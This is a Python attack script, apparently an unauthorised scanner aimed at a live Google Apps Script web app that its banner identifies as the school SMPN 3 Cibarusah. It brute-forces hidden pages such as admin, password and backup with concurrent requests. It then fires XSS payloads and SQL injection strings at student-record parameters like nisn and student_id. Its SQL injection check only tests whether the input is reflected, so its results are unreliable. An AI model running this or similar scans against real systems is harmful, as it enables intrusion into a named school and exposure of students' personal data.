#!/usr/bin/env python3
"""
Google Apps Script Parameter Fuzzer
Find hidden endpoints and parameters
"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"

# Common page parameters for school systems
PAGES = [
    'admin', 'dashboard', 'login', 'logout', 'profile',
    'student', 'siswa', 'guru', 'teacher', 'staff',
    'data', 'search', 'cari', 'edit', 'update', 'delete',
    'report', 'laporan', 'nilai', 'grade', 'absensi',
    'config', 'setting', 'pengaturan', 'backup',
    'user', 'password', 'reset', 'register',
    'kelas', 'class', 'jadwal', 'schedule',
    'ujian', 'test', 'exam', 'soal', 'question',
    'upload', 'download', 'export', 'import',
    'walas', 'talk', 'chat', 'message', 'pesan'
]

# Common parameters
PARAMS = [
    'id', 'user_id', 'student_id', 'nisn', 'nis',
    'name', 'nama', 'email', 'phone', 'telepon',
    'class', 'kelas', 'grade', 'tahun', 'year',
    'action', 'cmd', 'method', 'type', 'mode'
]

def test_endpoint(page):
    """Test a single page parameter"""
    try:
        url = f"{BASE_URL}?page={page}"
        response = requests.get(url, timeout=10, allow_redirects=True)
        
        # Analyze response
        if response.status_code == 200:
            length = len(response.text)
            
            # Check for interesting keywords
            keywords = ['error', 'unauthorized', 'forbidden', 'login', 'dashboard', 
                       'data', 'table', 'form', 'input', 'button']
            
            found_keywords = [kw for kw in keywords if kw in response.text.lower()]
            
            return {
                'page': page,
                'status': response.status_code,
                'length': length,
                'keywords': found_keywords,
                'url': url
            }
        else:
            return None
            
    except Exception as e:
        return None

def fuzz_pages():
    """Fuzz all page parameters"""
    print(f"[*] Fuzzing page parameters...")
    print(f"[*] Testing {len(PAGES)} endpoints\n")
    
    results = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(test_endpoint, page): page for page in PAGES}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                print(f"[+] Found: ?page={result['page']} "
                      f"(Status: {result['status']}, Length: {result['length']})")
                if result['keywords']:
                    print(f"    Keywords: {', '.join(result['keywords'])}")
    
    return results

def test_parameter_injection(page, param, payload):
    """Test for injection vulnerabilities"""
    try:
        url = f"{BASE_URL}?page={page}&{param}={payload}"
        response = requests.get(url, timeout=10)
        
        # Check for reflection
        if payload in response.text:
            return True
        return False
    except:
        return False

def test_injections(discovered_pages):
    """Test discovered pages for injection vulns"""
    print("\n[*] Testing for injection vulnerabilities...\n")
    
    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
    ]
    
    sqli_payloads = [
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' UNION SELECT NULL--",
    ]
    
    for page_result in discovered_pages:
        page = page_result['page']
        
        for param in PARAMS:
            # Test XSS
            for payload in xss_payloads:
                if test_parameter_injection(page, param, payload):
                    print(f"[!] XSS Found: ?page={page}&{param}={payload}")
            
            # Test SQLi
            for payload in sqli_payloads:
                if test_parameter_injection(page, param, payload):
                    print(f"[!] SQLi Found: ?page={page}&{param}={payload}")

def main():
    print("""
╔═══════════════════════════════════════════════════╗
║   Google Apps Script Parameter Fuzzer            ║
║   Target: SMPN 3 Cibarusah                       ║
╚═══════════════════════════════════════════════════╝
    """)
    
    # Fuzz page parameters
    discovered = fuzz_pages()
    
    if discovered:
        print(f"\n[+] Total endpoints discovered: {len(discovered)}")
        
        # Test for injections
        test_injections(discovered)
    else:
        print("[!] No additional endpoints found")
    
    print("\n[*] Scan complete!")

if __name__ == "__main__":
    main()
